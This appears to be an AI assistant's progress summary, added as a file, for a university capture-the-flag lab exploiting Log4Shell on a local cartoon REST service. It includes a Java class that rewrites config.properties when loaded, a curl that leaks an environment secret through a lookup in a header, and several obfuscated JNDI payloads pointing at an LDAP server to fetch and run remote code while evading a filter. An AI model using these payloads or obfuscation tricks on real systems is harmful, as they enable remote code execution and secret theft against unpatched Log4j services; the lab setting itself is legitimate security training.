@@ -1,0 +1,62 @@
+Here's a detailed summary of what we've achieved so far and what's needed to solve Flag 3:
+What We've Accomplished
+
+We've identified that Flag 3 requires updating the "config.properties" file to change the "rating" property to your GATECH_ID (904074283).
+We've successfully compiled the Exploit.java file that will update the config.properties file correctly when triggered:
+
+javaCopyimport java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.util.Properties;
+
+public class Exploit {
+    static {
+        try {
+            // Load the existing properties file
+            Properties props = new Properties();
+            FileInputStream in = new FileInputStream("config.properties");
+            props.load(in);
+            in.close();
+            
+            // Update only the rating property to your GATECH_ID
+            props.setProperty("rating", "904074283");
+            
+            // Save the properties back to the file
+            FileOutputStream out = new FileOutputStream("config.properties");
+            props.store(out, null);
+            out.close();
+            
+            System.out.println("Successfully updated rating property!");
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+
+We've set up the LDAP and Python HTTP servers correctly in the right directories.
+We've discovered that the "location" header is the attack vector, confirmed by being able to get Flag 1 using:
+
+Copycurl 'http://localhost:8080/rest/cartoons/cartoon/7bf1425e-f718-4bd9-ba8d-330165d1050a' -H 'GATECH_ID:904074283' -H 'location:${env:ADMIN_PASSWORD}'
+
+We're encountering a "teapot" error when trying to inject JNDI lookups, indicating we need to obfuscate our JNDI injection.
+
+Next Steps to Get Flag 3
+
+Try different obfuscation techniques: Since the application is blocking our JNDI lookups, we need to try different obfuscation techniques with the location header. Here are several to try:
+
+Copycurl 'http://localhost:8080/rest/cartoons/cartoon/7bf1425e-f718-4bd9-ba8d-330165d1050a' -H 'GATECH_ID:904074283' -H 'location:${j${::-}n${::-}d${::-}i:ldap://172.17.0.1:1389/Exploit}'
+Copycurl 'http://localhost:8080/rest/cartoons/cartoon/7bf1425e-f718-4bd9-ba8d-330165d1050a' -H 'GATECH_ID:904074283' -H 'location:${${lower:j}ndi:ldap://172.17.0.1:1389/Exploit}'
+Copycurl 'http://localhost:8080/rest/cartoons/cartoon/7bf1425e-f718-4bd9-ba8d-330165d1050a' -H 'GATECH_ID:904074283' -H 'location:${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://172.17.0.1:1389/Exploit}'
+
+Watch both LDAP and HTTP servers for activity: When running these commands, watch both server terminals to see if they receive any connections, which would indicate our payload is working.
+Check console.log for Exploit output: Our Exploit.java has a System.out.println statement that should appear in console.log if it's triggered successfully.
+
+Copytail -f console.log
+
+Verify the config.properties file: After a potentially successful attempt, check if the config.properties file was actually updated:
+
+Copycat config.properties
+
+Try the GET request again after updating: After a successful update to the file, try getting the cartoon again to see if the flag appears:
+
+Copycurl 'http://localhost:8080/rest/cartoons/cartoon/7bf1425e-f718-4bd9-ba8d-330165d1050a' -H 'GATECH_ID:904074283'
+The key to success is finding the right obfuscation technique that bypasses the protection but still triggers the Log4j vulnerability, and ensuring our Exploit.java properly updates the config file without overwriting other properties.
